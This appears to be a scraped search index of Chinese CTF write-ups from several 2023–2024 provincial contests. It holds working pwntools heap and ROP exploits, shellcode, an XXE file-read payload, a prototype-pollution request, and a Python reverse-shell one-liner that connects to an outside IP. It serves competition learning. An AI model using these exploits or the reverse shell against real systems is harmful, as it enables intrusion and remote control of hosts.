calc(data): mark=0xfff000000000 data1=data\u0026mark result=0 result|=data1 for i in range(3): data1=((data1\u003e\u003e12)^data)\u0026(mark\u003e\u003e12) result|=data1 mark=mark\u003e\u003e12 return result pass e=ELF(\"./pwn\") #p=process(\"./pwn\") p=remote('10.1.197.36',9999) p.readuntil(b'gift:\\n') e.address=int(p.readline(),16)-0x1a44 #gdb.attach(p) add(0x400) add(0x400) add(0x400) free(0) free(1) free(2) show(1) d=u64(p.read(8)) print(hex(d)) d=calc(d) print(hex(d)) _4180=e.address+0x4180 edit(1,p64(_4180^((d+0x410)\u003e\u003e12))) add(0x400) add(0x400) add(0x400) payload=p32(0xf0)*10 edit(5,payload) p.sendline('6') p.interactive()","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:4:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r4.2 printFFF题目允许写入0x15字节的shellcode，但是不够获取shell 所以利用exit的got表第二次写shellcode，并在第一次shellcode中设置一些环境 这样第二次shellcode就可以直接调用system(\"sh\")来获取shell from pwn import * context.arch='amd64' shellcode=\"\"\" mov edi,0x404800 mov eax,0x6873 mov [rdi],rax pop rdi sub rdi,0x6D jmp rdi \"\"\" shellop=asm(shellcode) print(hex(len(shellop))) #exit() e=ELF(\"./pwn\") #p=process(\"./pwn\") p=remote(\"10.1.197.38\",9999) #gdb.attach(p,'bp 0x4010E0') p.send(shellop) pause() exit_=e.got['exit'] p.send(p64(0x405000)+p64(exit_)+p64(4)) p.interactive() shellcode=\"\"\" mov edi,0x404800 mov rax,[0x404030] sub rax,0xc3a60 jmp rax \"\"\" shellop=asm(shellcode) print(hex(len(shellop))) p.send(shellop) pause() exit_=e.got['exit'] p.send(p64(0x405000)+p64(exit_)+p64(4)) pause() p.interactive()","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:4:2","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r4.3 reverse_stack在程序扩展栈空间的时候存在整数溢出，让下一个函数的栈在当前函数的前面，就可以实现修改程序流 通过修改程序流让程序第二次使用mmap创建第二个栈 这两个栈是连续的，这样在第一次调用函数时写入的栈地址就在程序栈的中间，就可以获取栈中的数据，比如libc_start_main的地址 之后就可以构造rop链获取shell from pwn import * #context.log_level='debug' def l(size): p.sendafter('long?\\n',p64(size\u0026(0xffffffffffffffff))) def d(data): p.sendafter('buf\\n',data) def pill(n): if n: p.sendafter('pill?\\n',b'red'.ljust(8,b'\\x00')) else: p.sendafter('pill?\\n',b'blue'.ljust(8,b'\\x00')) p=remote(\"10.1.197.37\",9999) #p=process('./pwn') e=ELF(\"./pwn\") #pause() l(0x40) d('asdfadsf') pill(1) l(0x400) d(b'\\x87') pill(0) l(0x58) d('asdfasdf') p.read(0x40) d_=u64(p.read(8)) d_=u64(p.read(8)) print(hex(d_)) e.address=d_-0x1233 d_=u64(p.read(8)) print(hex(d_)) stack=d_\u0026(-0x1000) pill(1) for i in range(10): l(0x400) d('asdfadsf') pill(1) l(-0x400) pill(1) l(0x500) payload=b'a'*0x3c8+p64(e.address+0x1050)+p64(stack+0x5000) d(payload) p.readuntil('pill?\\n') p.send(b'blue'.ljust(8,b'\\x00')) for i in range(0x102): l(0x1f0) d('asd') pill(1) l(-0x400) pill(1) l(0x500) payload=b'a'*0x3c8+p64(e.address+0x11CE)+p64(stack-0x78) d(payload) p.readuntil('pill?\\n') p.send(b'blue'.ljust(8,b'\\x00')) p.read(0x70) d_=u64(p.read(8)) print(hex(d_)) real_stack=d_ pill(1) l(-0x400) pill(1) l(0x1f0) d('rotwill') pill(1) l(0x500) payload=b'a'*(0x3c8-33*0x10)+p64(e.address+0x11ce)+p64(real_stack-0x4d0-8) d(payload) p.readuntil('pill?\\n') p.send(b'blue'.ljust(8,b'\\x00')) p.read(0x4d0) d_=u64(p.read(8)) print(hex(d_)) pause() pill(1) #p.interactive() libc=ELF(\"./libc.so.6\") libc.address=d_-0x29d90 gadget=libc.address+0xebc81 l(-0x400) pill(1) l(0x500) system=libc.sym['system'] rdi=0x000000000002a3e5+libc.address bin_sh=next(libc.search(b'/bin/sh\\x00')) ret=rdi+1 #gdb.attach(p,'bp $rebase(0x1228)\\nc') #pause() payload=b'a'*(0x3c8)+p64(ret)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(stack+0x18000) d(payload) p.readuntil('pill?\\n') p.send(b''.ljust(8,b'\\x00')) p.interactive()","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:4:3","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r5 数据安全","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:5:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r5.1 datasecurity_classify1from string import ascii_letters import os phone_prefix = [ 734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778, 782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755, 756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777, 780, 781, 789, 790, 791, 793, 799 ] id_card_xishu = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2] odd = \"1 0 X 9 8 7 6 5 4 3 2\".split(' ') if os.path.exists('result.csv'): os.remove('result.csv') with open('result.csv','+a') as result: result.write('类型,数据值\\n'); with open('data.csv','rb') as data: for line in data.readlines(): line = line.decode().strip(); if len(line) == 18: # id card qian_17 = line[:17] sums = 0; for i,e in enumerate(qian_17): e = int(e) * id_card_xishu[i]; sums += e; if line[-1] != odd[sums % 11]: continue; result.write('身份证号,'+line + '\\n'); elif len(line) == 11: for prefix in phone_prefix: if line.startswith(str(prefix)): result.write('手机号,'+line + '\\n'); break; else: if '数据值' in line: continue; # name sign = False; for i in ascii_letters: if i in line: sign = True; break; if not sign: result.write('姓名,'+line + '\\n');","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:5:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r5.2 datasecurity_classify2先用tshark提取数据 tshark -r data.pcapng -T felds -Y \"http.request.method==POST\" -e data除了文档中的要求外注意处理ip的范围 def veryifyIdCard(idcard): if len(idcard) != 18: return False; idcardList.append(idcard) idcard = idcard.upper() id_card_xishu = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2] odd = \"1 0 X 9 8 7 6 5 4 3 2\".split(' ') sums = 0; qian_17 = idcard[:17] for i,e in enumerate(qian_17): e = int(e) * id_card_xishu[i]; sums += e; return idcard[-1] == odd[sums % 11]; def verifyPhone(phone): phone_prefix = [ 734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778, 782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755, 756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777, 780, 781, 789, 790, 791, 793, 799 ] if len(phone) != 11 or phone[-1] == 'X': return False; for prefix in phone_prefix: if phone.startswith(str(prefix)): return True; return False; def verifyIp(ip): for i in ip.split('.'): if int(i) \u003e 255: return False; return True; def cleanData(data): if '-' in data: data = ''.join(data.split('-')) elif ' ' in data: data = ''.join(data.split(' ')) return data; import re,os ipMatch = re.compile(r'[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'); phoneMatch = re.compile('(\\d{11}|\\d{3}\\ \\d{4}\\ \\d{4}|\\d{3}\\-\\d{4}\\-\\d{4})'); idcardMatch = re.compile('(\\d{18}|\\d{6}\\ \\d{8}\\ \\d{4}|\\d{6}\\-\\d{8}\\-\\d{4})'); idcardMatch_with_x = re.compile('(\\d{17}X|\\d{6}\\ \\d{8}\\ \\d{3}X|\\d{6}\\-\\d{8}\\-\\d{3}X)'); idcardList = [] if os.path.exists('result2.csv'): os.remove('result2.csv') with open('result2.csv','+a') as result: result.write('category,value\\n'); with open('data.dat', 'r') as data: data2 = bytes.fromhex(data.read()).decode(); for line in data2.split(','): if idcardMatch.findall(line): for e in idcardMatch.findall(line): e = cleanData(e); if veryifyIdCard(e): result.write('idcard,' + e + '\\n'); if idcardMatch_with_x.findall(line): for e in idcardMatch_with_x.findall(line): e = cleanData(e); if veryifyIdCard(e): result.write('idcard,' + e + '\\n'); if phoneMatch.findall(line): for e in phoneMatch.findall(line): e = cleanData(e); sign = True; for card in idcardList: if e in card: sign = False; break; if not sign: continue; if verifyPhone(e): result.write('phone,' + e + '\\n'); if ipMatch.findall(line): for e in ipMatch.findall(line): if verifyIp(e): result.write('ip,' + e + '\\n'); ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:5:2","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r6 crypto","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:6:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r6.1 MyCode根据加密内容生成key并爆破即可 import numpy as np def substitute(state, sub_box): return [sub_box[b \u0026 0xF] | (sub_box[(b \u003e\u003e 4) \u0026 0xF] \u003c\u003c 4) for b in state] def generate_round_keys(base_key, rounds): round_keys = [] temp_key = base_key for _ in range(rounds): round_keys.append(temp_key \u0026 0xFFFFFFFF) temp_key ^= ((temp_key \u003c\u003c 1) \u0026 0xFFFFFFFF) | ((temp_key \u003e\u003e 31) \u0026 0x1) return round_keys def process_state(base_key, state, rounds, encrypt): sub_box = [0x9, 0x4, 0xA, 0xB, 0xD, 0x1, 0x8, 0x5, 0x6, 0x2, 0x0, 0x3, 0xC, 0xE, 0xF, 0x7] inv_sub_box = [0xA, 0x5, 0x9, 0xB, 0x1, 0x7, 0x8, 0xF, 0x6, 0x0, 0x2, 0x3, 0xC, 0x4, 0xD, 0xE] round_keys = generate_round_keys(base_key, rounds) if encrypt: for round in range(rounds): state = substitute(state, sub_box) state = [s ^ ((round_keys[round] \u003e\u003e (i * 8)) \u0026 0xFF) for i, s in enumerate(state)] else: for round in range(rounds - 1, -1, -1): state = [s ^ ((round_keys[round] \u003e\u003e (i * 8)) \u0026 0xFF) for i, s in enumerate(state)] state = substitute(state, inv_sub_box) return state def encrypt(plaintext, key, rounds=10): length = len(plaintext) padded_length = length if length % 4 == 0 else length + (4 - (length % 4)) plaintext += b'\\x00' * (padded_length - length) ciphertext = bytearray(padded_length) for i in range(0, padded_length, 4): state = list(plaintext[i:i + 4]) state = process_state(key, state, rounds, True) ciphertext[i:i + 4] = state return ciphertext def decrypt(ciphertext, key, rounds=10): length = len(ciphertext) plaintext = bytearray(length) for i in range(0, length, 4): state = list(ciphertext[i:i + 4]) state = process_state(key, state, rounds, False) plaintext[i:i + 4] = state return plaintext.rstrip(b'\\x00') def main(): # plaintext = b\"DASCTF{******}\" # key = 0xECB... # 4 bytes # ciphertext = encrypt(plaintext, key) # print(\"Ciphertext:\", ''.join(f\"{b:02X}\" for b in ciphertext)) Ciphertext = 'A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401' Ciphertext = bytes.fromhex(Ciphertext) for i in range(0xFFFFF + 1): key = 0xecb00000 + i re = decrypt(Ciphertext, key) print(re) if b'DAS' in re: break if __name__ == \"__main__\": main() ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:6:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r7 信创安全","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:7:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r7.1 OHapp会在点击事件中对输入进行加密，将加密之后的数据与/aPR+E8wS9+XbFMUfm8NacHpP190pf5xaR8+MIm/8gw=进行比较 程序加密的调用流程为encrypt-\u003eencryptX-\u003eencryptY-\u003eencodeX-\u003eencodeY 分析初始化函数发现，加密使用的密钥相同，为DASCTF2024-OHAPP，encryptX为aes-128|ecb加密，encryptY为aes-128|cbc加密 分析encryptY，发现疑似使用encryptX的结果作为cbc的iv 程序将明文从中间分为两个十六位字符串，前十六位进行encryptX加密，后十六位进行encryptY加密 ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:7:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r8 签到","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:8:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r8.1 网安知识大挑战-FINAL简单的问题，直接做了 DBCCCCBCDB 根据提示用Triple DES解密得到flag ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:8:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r1 Web","date":"2024-05-06","objectID":"/posts/3ccf1dc/:1:0","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r1.1 web-1正常网页访问无法得到 flag ，因为有弹窗一直阻塞，所以用 curl 命令即可 curl -i http://ip:port","date":"2024-05-06","objectID":"/posts/3ccf1dc/:1:1","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r1.2 web-2看到网页源代码中的发送方法，是拼接了 xxe flag 在 /flag 下，但是没回显，所以想办法使用 DTD 进行外带，但是外带不可取 所以利用本地存在的 DTD 进行攻击 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"\u003e \u003c!ENTITY % expr 'aaa)\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"file:///flag\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb'\u003e %local_dtd; ]\u003e \u003cperson\u003e\u003cusername\u003e\u0026xxe;\u003c/username\u003e\u003cpassword\u003e1\u003c/password\u003e\u003c/person\u003e flag{81324bd5f1a7667753f108357c1bda728f6fb815} ","date":"2024-05-06","objectID":"/posts/3ccf1dc/:1:2","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r2 Misc","date":"2024-05-06","objectID":"/posts/3ccf1dc/:2:0","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r2.1 misc-1StegSolve 777导出16进制 文本复制观察每行第一个字母，得到 PixelJihad_key:ezgame ","date":"2024-05-06","objectID":"/posts/3ccf1dc/:2:1","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r2.2 misc-2零宽 猜测为 ilove 1 and 0 二进制 圆圈为0 直线为1 绘图 [C[C[C[SFS]]]] 替换为1 [[[[RS[[[FS]]]]]]] [[[[[F]][R[[[SF]]S]]S]]]、[[R[FSFSFSF]S]FSF][[R[FSFFSF]]FSF]、[[RS[FSFSF]]FSF][[R[FFSF]]FSF]、[[R[FFSFFF]]FSF][[R[FSFFSFSF]]FSF]、[[R[FSFSF]]FSF][[R[FSFSF]]FF] 替换为0 [C[C[C[CRR[[R[FSFSF]]FSF][C[R[FSFFS]]FF]]]、[C[C[C[CRR[[R[FSFSF]]FSF][C[R[FSFFS]]FF]]] 替换为0000 替换后，得到如下二进制 01100110011011000110000101100111011110110011000101011111011101110110000101101110011011100110000101011111011000110011000101110010011000110110110000110011011100110101111100110100011011100110010001011111001100010110100101101110001100110111001101111101二进制转字符 ","date":"2024-05-06","objectID":"/posts/3ccf1dc/:2:2","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r3 Reverse","date":"2024-05-06","objectID":"/posts/3ccf1dc/:3:0","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r3.1 re-1两次 RC4 加密，第一次加密了 key ，第二次使用加密的 key 加密 flag #include\u003cstdio.h\u003e #include\u003cstdint.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e void rc4_init(unsigned char* s,char* key,unsigned long len){ int i = 0; int j = 0; unsigned char k[256]={0}; unsigned char temp =0; for(i = 0;i \u003c 256;i++){ s[i]=i; k[i]=key[i%len]; } for(i = 0;i \u003c 256;i++){ j=(j+s[i]+k[i])%256; temp = s[i]; s[i] = s[j]; s[j] = temp; } } unsigned __int64 __fastcall init(__int64 a1, __int64 a2, unsigned __int64 a3) { char v4; // [rsp+23h] [rbp-41Dh] int i; // [rsp+24h] [rbp-41Ch] int v6; // [rsp+28h] [rbp-418h] int j; // [rsp+2Ch] [rbp-414h] int v8[258]; // [rsp+30h] [rbp-410h] BYREF memset(v8, 0, 0x400uLL); for ( i = 0; i \u003c= 255; ++i ) { *(char *)(i + a1) = i; v8[i] = *(unsigned __int8 *)(i % a3 + a2); } v6 = 0; for ( j = 0; j \u003c= 255; ++j ) { v6 = (v8[j] + v6 + *(unsigned __int8 *)(j + a1)) % 256; v4 = *(char *)(j + a1); *(char *)(j + a1) = *(char *)(v6 + a1); *(char *)(a1 + v6) = v4; } } __int64 __fastcall crypt1(__int64 a1, __int64 a2, unsigned __int64 a3) { __int64 result; // rax char v4; // [rsp+27h] [rbp-11h] int v5; // [rsp+28h] [rbp-10h] int v6; // [rsp+2Ch] [rbp-Ch] int i; // [rsp+30h] [rbp-8h] v5 = 0; v6 = 0; for ( i = 0; ; ++i ) { result = i; if ( a3 \u003c= i ) break; v5 = (v5 + 1) % 256; v6 = (v6 + *(unsigned __int8 *)(v5 + a1)) % 256; v4 = *(char *)(v5 + a1); *(char *)(v5 + a1) = *(char *)(v6 + a1); *(char *)(a1 + v6) = v4; *(char *)(i + a2) ^= *(char *)((unsigned __int8)(*(char *)(v5 + a1) + *(char *)(v6 + a1)) + a1); } return result; } crypt2(__int64 a1, __int64 a2, unsigned __int64 a3) { __int64 result; // rax char v4; // [rsp+27h] [rbp-11h] int v5; // [rsp+28h] [rbp-10h] int v6; // [rsp+2Ch] [rbp-Ch] int i; // [rsp+30h] [rbp-8h] v5 = 0; v6 = 0; for ( i = 0; ; ++i ) { result = i; if ( a3 \u003c= i ) break; v5 = (v5 + 1) % 256; v6 = (v6 + *(unsigned __int8 *)(v5 + a1)) % 256; v4 = *(char *)(v5 + a1); *(char *)(v5 + a1) = *(char *)(v6 + a1); *(char *)(a1 + v6) = v4; *(char *)(i + a2) += *(char *)((unsigned __int8)(*(char *)(v5 + a1) + *(char *)(v6 + a1)) + a1); } return result; } int main(){ char key1[8] = \"keykey\"; char key[12] = \"ban_debug!\"; unsigned char s[256]={0}; unsigned int length = strlen(key1); init(s,key1,length); unsigned int length2 = strlen(key); crypt1(s,key,length2); // seconds unsigned int v0 = strlen(key); init(s,key,v0); unsigned char flag[] = { 0x4E, 0x47, 0x38, 0x47, 0x62, 0x0A, 0x79, 0x6A, 0x03, 0x66, 0xC0, 0x69, 0x8D, 0x1C, 0x84, 0x0F, 0x54, 0x4A, 0x3B, 0x08, 0xE3, 0x30, 0x4F, 0xB9, 0x6C, 0xAB, 0x36, 0x24, 0x52, 0x81, 0xCF }; unsigned int v2 = strlen(flag); crypt2(s,flag,v2); printf(flag); } //flag{1237-12938-9372-1923-4u92} ","date":"2024-05-06","objectID":"/posts/3ccf1dc/:3:1","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r3.2 re-2upx 的壳，但魔改过了，直接用 dbg 动调就可以，在执行完加密函数后下断点，记得输入的 flag 长度要为 27，才能进入到加密函数中，他的加密函数是直接解密了 flag 所以通过调试可以直接得到 flag ","date":"2024-05-06","objectID":"/posts/3ccf1dc/:3:2","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r4 Crypto","date":"2024-05-06","objectID":"/posts/3ccf1dc/:4:0","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r4.1 crypto-1import json import websocket from Crypto.Util.number import * from gmpy2 import * def get_flag(websocket): result = \"\" websocket.send( json.dumps({\"cmd\": \"get_flag\"}) ) while result == \"\" or \"Pls send msgs and I'll return the result\" in result: result = websocket.recv() return result def f(websocket, cmd, data): result = \"\" websocket.send(json.dumps({\"cmd\": cmd, \"data\": data.zfill(512)})) while result == \"\" or \"Pls send msgs and I'll return the result\" in result: result = websocket.recv() return result uri = \"ws://xxx\" ws = websocket.create_connection(uri) c = int(get_flag(ws), 16) c2 = int(f(ws, \"enc\", hex(2)[2:]), 16) c3 = int(f(ws, \"enc\", hex(3)[2:]), 16) c4 = int(f(ws, \"enc\", hex(4)[2:]), 16) c9 = int(f(ws, \"enc\", hex(9)[2:]), 16) n = GCD(c2**2 - c4, c3**2 - c9) enc_flag_2 = c2 * c % n flag_2 = int(f(ws, \"dec\", hex(enc_flag_2)[2:]), 16) print(long_to_bytes(flag_2 // 2))","date":"2024-05-06","objectID":"/posts/3ccf1dc/:4:1","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r4.2 crypto-2使用他的客户端程序 分别输入 uid=admin ，seed=任意值 ，然后会打开一个 python 的客户端，这个时候输入的 seed 要和前面的 seed 一致 然后发送消息 give me flag 在网页中得到 flag ","date":"2024-05-06","objectID":"/posts/3ccf1dc/:4:2","tags":["比赛","WP"],"title":"2024年第七届天一永安杯宁波市赛初赛WP","uri":"/posts/3ccf1dc/"},{"categories":["WP"],"content":"\r1 排名 ","date":"2024-05-05","objectID":"/posts/edebc43/:1:0","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2 解题思路","date":"2024-05-05","objectID":"/posts/edebc43/:2:0","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.1 WEB\r2.1.1 easyrce过滤了一些东西，用 file 伪协议即可 http://1d99bce9.clsadp.com/?PK=file:///flag得到 flag flag{95fbdea5c514a22bbfb4cd91c068560f} 2.1.2 mua 扫目录访问 robots.txt ，根据提示访问 /substr_pass.php 在 /substr_pass.php 页面中查看源代码发现存在提示传参 a=xx\u0026b=xx 根据文件名 substr_pass 猜测用于切割密码，且每次切割查看最多的长度是 3，且爆破后发现长度到 81 后截止，直接脚本跑密码 import requests url = 'http://5756eee1.clsadp.com/substr_pass.php?a=%s\u0026b=3' all = b'' for i in range(0,82,3): b = url % i r = requests.get(url=b) all += r.content[:3] print(all.decode()) #password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善\u003c #最后的 `\u003c` 符号需要去掉 访问 shell.php 构造 payload 即可 http://5756eee1.clsadp.com/shell.php?pass=password%E6%98%AF%E5%AF%8C%E5%BC%BA%E6%B0%91%E4%B8%BB%E6%96%87%E6%98%8E%E5%92%8C%E8%B0%90%E8%87%AA%E7%94%B1%E5%B9%B3%E7%AD%89%E5%85%AC%E6%AD%A3%E6%B3%95%E5%88%B6%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E8%AF%9A%E4%BF%A1%E5%8F%8B%E5%96%84\u0026cmd=cat%20/h*flag{d6ad3f657b1c54ba8336c170d7b762b9} 2.1.3 PPP 通过 merge 函数原型链污染修改 evilFunc 函数的默认 shell 值即可 POST / HTTP/1.1 Host: 648bc958.clsadp.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/form-json Content-Length: 95 {\"__class__\": {\"__init__\": {\"__globals__\": {\"evilFunc\": {\"__kwdefaults__\": {\"shell\": true}}}}}} 然后访问 / 路由，执行命令即可，由于命令返回值是 print ，而不是 return ，所以需要反弹，但是靶机上使用 nc 反弹失败，改用 python 即可 vps 端进行监听 nc -lvvp 8080http://648bc958.clsadp.com/eval?cmd=python%20-c%20%22import%20os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27120.48.7.238%27,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%27/bin/bash%27,%27-i%27]);%22 flag{83fa778552fddfa2a188a89f281b580b} ","date":"2024-05-05","objectID":"/posts/edebc43/:2:1","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.2 REVERSE\r2.2.1 ezpython使用 pyinstxtractor 解包 python3 pyinstxtractor.py main.exe得到 解包后的文件夹，找到 main.pyc 后，进行反编译 uncompyle6 main.pyc \u003e main.py得到源码 # uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.7.16 (default, Jan 17 2023, 16:06:28) [MSC v.1916 64 bit (AMD64)] # Embedded file name: main.py import sys str = 'cidb~071c75g62=a=d2=acc211c010`1\u003c`gacx' str1 = '' flag = input('�������flag��') if len(flag) != 38: print('The length you enter is 38.......no no no no not flag') sys.exit() for i in range(38): str1 += chr(ord(flag[i]) ^ 5) else: if str1 == str: print('yes is flag') else: print('no no no no........') # okay decompiling main.pyc简单异或，直接编写脚本即可 str = 'cidb~071c75g62=a=d2=acc211c010`1\u003c`gacx' for i in str: i = chr(ord(i) ^ 5) print(i,end='') #flag{524f20b378d8a78dff744f545e49ebdf}\r2.2.2 ezpe使用strings查看文件得到两段字符串 Yes,you found me!Now I can tell you,flag is flag{key1_key2},but where is the key???Do not frustrated!I can give you key1,key1:w0w! Now go find key2! +++++ +++++ [-\u003e++ +++++ +++\u003c] \u003e++++ +++.- ----- .\u003c+++ +[-\u003e+ +++\u003c] \u003e++++ .\u003c+++ +++++ [-\u003e-- ----- -\u003c]\u003e- ----- -.+++ +++++ .\u003c+++ +[-\u003e+ +++\u003c] \u003e++++ ++.\u003c+ ++[-\u003e ---\u003c] \u003e--.\u003c +++++ [-\u003e++ +++\u003c] \u003e+.\u003c+ +++[- \u003e++++ \u003c]\u003e++ ++.\u003c+ ++++[ -\u003e--- --\u003c]\u003e ----- -.\u003c++ +++[- \u003e---- -\u003c]\u003e- ----- --.\u003c+ +++++ ++[-\u003e +++++ +++\u003c] \u003e++.\u003c ++++[ -\u003e--- -\u003c]\u003e- -.\u003c++ ++[-\u003e ++++\u003c ]\u003e+.\u003c +++++ [-\u003e-- ---\u003c] \u003e---- --.\u003c+ ++++[ -\u003e--- --\u003c]\u003e ----- ----. \u003c++++ +++[- \u003e++++ +++\u003c] \u003e+.-- ----. \u003c++++ ++[-\u003e ----- -\u003c]\u003e- ----- ----. \u003c+++[ -\u003e--- \u003c]\u003e-- --.\u003c+ +++++ +[-\u003e+ +++++ +\u003c]\u003e+ +++++ ++++. \u003c++++ [-\u003e++ ++\u003c]\u003e ++++. ++.\u003c+ +++++ +[-\u003e- ----- -\u003c]\u003e- -.\u003c++ +++++ [-\u003e++ +++++ \u003c]\u003e+. \u003c++++ ++++[ -\u003e--- ----- \u003c]\u003e-- -.\u003c++ +++++ [-\u003e++ +++++ \u003c]\u003e++ +.\u003c在线 brainfuck 解密后，得到 key2 PE_sT3uctU3e_1$_suBt1e 